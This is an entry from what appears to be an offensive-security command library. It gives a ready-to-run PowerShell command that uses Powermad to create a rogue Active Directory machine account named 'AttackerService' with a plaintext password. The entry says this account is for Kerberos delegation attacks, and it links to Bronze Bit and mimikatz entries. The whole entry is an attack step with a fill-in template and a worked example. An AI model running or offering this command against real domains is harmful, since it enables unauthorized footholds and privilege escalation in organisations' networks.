---
type: command
executor: powershell
data: >-
  Import-Module .\Powermad\powermad.ps1; New-MachineAccount -MachineAccount
  AttackerService -Password (ConvertTo-SecureString 'AttackerServicePassword'
  -AsPlainText -Force)
tags:
  - active-directory
  - powermad
platforms:
  - Windows
verified: true
validated: true
---

# powershell-create-machine-account-powermad

## Command

```powershell
Import-Module .\Powermad\powermad.ps1; New-MachineAccount -MachineAccount $_MACHINE_NAME -Password (ConvertTo-SecureString '$_PASSWORD' -AsPlainText -Force)
```

## Description

Creates a rogue machine account in AD using Powermad for use in delegation attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -MachineAccount $_MACHINE_NAME | Name of machine account (e.g., AttackerService) | Yes |
| -Password $_PASSWORD | Plaintext password | Yes |

## Examples

### Basic Usage

```powershell
Import-Module .\Powermad\powermad.ps1; New-MachineAccount -MachineAccount AttackerService -Password (ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
```

## Expected Output

Account created successfully; no output.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
- [[commands/powershell-mimikatz-generate-kerberos-hash]]
